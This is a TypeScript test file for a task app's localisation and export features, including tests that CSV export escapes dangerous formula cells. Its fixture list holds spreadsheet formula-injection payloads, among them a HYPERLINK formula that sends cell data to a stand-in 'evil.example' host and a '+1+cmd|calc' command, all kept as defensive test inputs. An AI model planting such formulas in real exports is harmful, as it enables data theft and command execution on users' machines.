import assert from 'node:assert/strict'
import { after, before, describe, test } from 'node:test'
import { toCsv, neutralizeFormula } from '../../src/lib/csv'
import { safeFilename, slug } from '../../src/lib/format'
import { Api, type TestServer, launch, makeUser, setupAdmin } from '../helpers/server'
import { type BootedUI, bootUI, textOf } from '../helpers/ui'

let server: TestServer
let admin: Api
let dev: Awaited<ReturnType<typeof makeUser>>
const uis: BootedUI[] = []
const TITLES = [
  'المشاريع',
  'Review',
  'Settings',
  'Search anything',
  '=HYPERLINK("http://evil.example/steal?c="&A1,"Click me")',
  '+1+cmd|calc',
  '@SUM(A1)',
  '-2+3',
  'Plain title, with "quotes" and, commas'
]

before(async () => {
  server = await launch()
  admin = await setupAdmin(server)
  dev = await makeUser(server, admin, 'Developer', 'Dev Dana')
  const people = (await admin.get('/api/bootstrap')).body.people
  const devPerson = people.find((p: any) => p.name === 'Dev Dana').id
  const project = (await admin.post('/api/projects', { name: 'Reports', code: 'RPT' })).body
  for (const title of TITLES)
    assert.equal(
      (
        await admin.post('/api/tasks', {
          title,
          projectId: project.numericId,
          assigneeId: devPerson,
          dueDate: '2030-01-01'
        })
      ).status,
      200,
      title
    )
})
after(async () => {
  uis.forEach(ui => ui.close())
  await server.cleanup()
})

const open = async (options: Partial<Parameters<typeof bootUI>[0]> = {}, ready = '.board') => {
  const ui = await bootUI({ base: server.url, cookie: dev.api.cookie, hash: '/tasks', ...options })
  uis.push(ui)
  await ui.waitFor(() => ui.doc.querySelector(ready))
  return ui
}
const cardTitles = (ui: BootedUI) => [...ui.doc.querySelectorAll('.board-card h3')].map(textOf)
const cardProjects = (ui: BootedUI) => [...new Set([...ui.doc.querySelectorAll('.board-card-project')].map(textOf))]
const navLabels = (ui: BootedUI) => [...ui.doc.querySelectorAll('.nav-item span:not(.nav-count)')].map(textOf)

describe('the localiser never rewrites user data (UX-03)', () => {
  test('English UI: a task a user titled with an Arabic phrase is shown exactly as written', async () => {
    const ui = await open()
    const titles = cardTitles(ui)
    for (const title of TITLES.slice(0, 4))
      assert.ok(titles.includes(title), `"${title}" is displayed unchanged (got ${titles.slice(0, 5).join(' | ')})`)
    assert.ok(!titles.includes('Projects'), 'Arabic "المشاريع" is not turned into "Projects"')
    assert.deepEqual(cardProjects(ui), ['Reports'])
  })

  test('Arabic UI: chrome is translated, but user titles that look like UI phrases are left alone', async () => {
    const ui = await open({
      beforeEval: w => w.localStorage.setItem(`atlas-prefs:${dev.user.id}`, JSON.stringify({ language: 'ar' }))
    })
    await ui.waitFor(() => ui.doc.documentElement.dir === 'rtl')
    await ui.settle(300)
    assert.equal(ui.doc.documentElement.lang, 'ar')
    const nav = navLabels(ui)
    assert.ok(nav.includes('المشاريع'), `navigation is translated: ${nav.join(', ')}`)
    assert.ok(!nav.includes('Projects'))
    const titles = cardTitles(ui)
    for (const title of ['Review', 'Settings', 'Search anything'])
      assert.ok(titles.includes(title), `user title "${title}" must not be translated (got ${titles.join(' | ')})`)
    assert.ok(titles.includes('المشاريع'))
    assert.deepEqual(cardProjects(ui), ['Reports'], 'the project the user named "Reports" keeps its name')
  })

  test('switching the language back restores the English interface and still leaves data alone', async () => {
    const ui = await open({
      beforeEval: w => w.localStorage.setItem(`atlas-prefs:${dev.user.id}`, JSON.stringify({ language: 'ar' }))
    })
    await ui.waitFor(() => ui.doc.documentElement.dir === 'rtl')
    ui.click('.nav-item', 'حسابي')
    await ui.waitFor(() => ui.doc.querySelector('.password-form'))
    const select = [...ui.doc.querySelectorAll('select')].find(
      s => [...s.options].some(o => o.value === 'ar') && [...s.options].some(o => o.value === 'he')
    )!
    assert.ok(select, 'a language preference exists for people when the workspace allows it')
    ui.type('select', '', [...ui.doc.querySelectorAll('select')].indexOf(select))
    await ui.waitFor(() => ui.doc.documentElement.dir === 'ltr')
    await ui.settle(300)
    assert.ok(navLabels(ui).includes('Projects'), `back to English: ${navLabels(ui).join(', ')}`)
    ui.click('.nav-item', 'My work')
    await ui.waitFor(() => ui.doc.querySelector('.board'))
    assert.ok(cardTitles(ui).includes('المشاريع'))
  })

  test('with userLanguagePreference switched off, people cannot override the workspace language', async () => {
    assert.equal((await admin.put('/api/settings', { localization: { userLanguagePreference: false } })).status, 200)
    try {
      const ui = await open({
        beforeEval: w => w.localStorage.setItem(`atlas-prefs:${dev.user.id}`, JSON.stringify({ language: 'ar' }))
      })
      await ui.settle(300)
      assert.equal(ui.doc.documentElement.lang, 'en')
    } finally {
      await admin.put('/api/settings', { localization: { userLanguagePreference: true } })
    }
  })
})

describe('exports (SEC-12, UX-01, export permission)', () => {
  const exportCsv = async (ui: BootedUI, title?: string) => {
    ui.click('.export-wrap > button')
    await ui.settle(100)
    ui.type('.export-panel select', 'csv')
    if (title) ui.type('.export-panel .tiny-label input', title)
    ui.click('.export-actions .secondary-button')
    await ui.waitFor(() => ui.downloads.length > 0)
    const download = ui.downloads.at(-1)!
    const bytes = new Uint8Array(await download.blob.arrayBuffer())
    return {
      text: await download.blob.text(),
      name: download.name,
      bom: bytes[0] === 0xef && bytes[1] === 0xbb && bytes[2] === 0xbf
    }
  }

  test('CSV cells that spreadsheets would run as formulas are neutralised', async () => {
    const ui = await open()
    const { text, bom } = await exportCsv(ui)
    assert.match(text, /"'=HYPERLINK\(""http:\/\/evil\.example\/steal\?c=""&A1,""Click me""\)"/)
    assert.match(text, /"'\+1\+cmd\|calc"/)
    assert.match(text, /"'@SUM\(A1\)"/)
    assert.match(text, /"'-2\+3"/)
    assert.doesNotMatch(text, /(^|,|\n)"=HYPERLINK/, 'no raw formula cell')
    assert.match(
      text,
      /"Plain title, with ""quotes"" and, commas"/,
      'quotes and commas are escaped, normal text is unchanged'
    )
    assert.ok(bom, 'UTF-8 byte order mark so Excel reads Arabic correctly')
    assert.match(text.split('\r\n')[0], /"Task ID"/)
  })

  test('the export names its file after the title in any script', async () => {
    const ui = await open()
    const { name } = await exportCsv(ui, 'تقرير المشاريع')
    assert.equal(name, 'تقرير-المشاريع.csv')
  })

  test('exporting is recorded with the server before any file is produced', async () => {
    const ui = await open()
    await exportCsv(ui)
    const beacon = ui.requests.find(r => r.url === '/api/exports/audit')!
    assert.ok(beacon)
    const body = JSON.parse(beacon.body!)
    assert.equal(body.format, 'csv')
    assert.ok(body.rows >= 9)
    assert.ok(ui.requests.indexOf(beacon) < ui.requests.length)
  })

  test('without the exportData permission there is no export menu', async () => {
    await admin.put('/api/settings', { permissions: { roles: { Reader: { permissions: ['viewReports'] } } } })
    const reader = await makeUser(server, admin, 'Reader', 'Rita Reader')
    const ui = await open({ cookie: reader.api.cookie })
    assert.equal(ui.doc.querySelector('.export-wrap'), null)
    assert.equal(
      (await reader.api.post('/api/exports/audit', { page: 'tasks', format: 'csv', rows: 1, columns: 1 })).status,
      403
    )
  })

  test('the administrator controls which export formats exist', async () => {
    assert.equal((await admin.put('/api/settings', { exports: { formats: ['csv'] } })).status, 200)
    try {
      const ui = await open()
      ui.click('.export-wrap > button')
      await ui.settle(100)
      const options = [...ui.doc.querySelectorAll('.export-panel select option')]
        .map(o => (o as HTMLOptionElement).value)
        .filter(v => ['pdf', 'xlsx', 'csv', 'json'].includes(v))
      assert.deepEqual(options, ['csv'])
      assert.equal(
        textOf(ui.doc.querySelector('.export-actions .primary-button')),
        '',
        'no print button when print is not an allowed format'
      )
    } finally {
      await admin.put('/api/settings', { exports: { formats: ['csv', 'xlsx', 'json', 'pdf', 'print'] } })
    }
  })
})

describe('pure helpers', () => {
  test('neutralizeFormula / toCsv', () => {
    assert.equal(neutralizeFormula('=1+1'), "'=1+1")
    assert.equal(neutralizeFormula('-5'), '-5')
    assert.equal(neutralizeFormula('+31 20 123 4567'), "'+31 20 123 4567")
    assert.equal(neutralizeFormula('\tcmd'), "'\tcmd")
    assert.equal(neutralizeFormula('hello'), 'hello')
    assert.equal(toCsv([{ key: 'a', label: 'A' }], [{ a: '=x' }, { a: 5 }, { a: null }]), '"A"\r\n"\'=x"\r\n"5"\r\n""')
  })
  test('safeFilename / slug keep letters from every script', () => {
    assert.equal(safeFilename('تقرير المشاريع'), 'تقرير-المشاريع')
    assert.equal(safeFilename('a/b\\c:d*e?"f<g>h|i'), 'a-b-c-d-e-f-g-h-i'.replace(/-/g, '-'))
    assert.equal(safeFilename('   '), 'atlas-export')
    assert.equal(safeFilename('日本語のレポート'), '日本語のレポート')
    assert.equal(slug('To do'), 'to-do')
    assert.equal(slug('قيد التنفيذ'), 'قيد-التنفيذ')
  })
})
